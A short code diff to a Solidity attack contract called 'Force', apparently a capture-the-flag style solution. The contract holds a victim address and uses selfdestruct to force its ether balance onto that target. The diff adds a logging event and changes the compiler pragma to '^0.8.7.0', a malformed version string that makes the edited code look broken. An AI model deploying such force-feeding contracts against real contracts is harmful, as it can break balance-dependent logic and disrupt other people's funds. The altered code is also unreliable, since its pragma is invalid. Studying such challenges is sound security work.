@@ -1,8 +1,10 @@
 // SPDX-License-Identifier: GPL-3.0
-pragma solidity ^0.8.7;
+pragma solidity ^0.8.7.0;
 
 contract Force {
   address payable public victimAddress;
+
+  event Received(uint amount);
 
   constructor(address payable _victimAddress) {
       victimAddress = _victimAddress;
@@ -15,5 +17,7 @@ contract Force {
     selfdestruct(victimAddress);
   }
 
-  receive() external payable {}
+  receive() external payable {
+    emit Received(msg.value);
+  }
 }
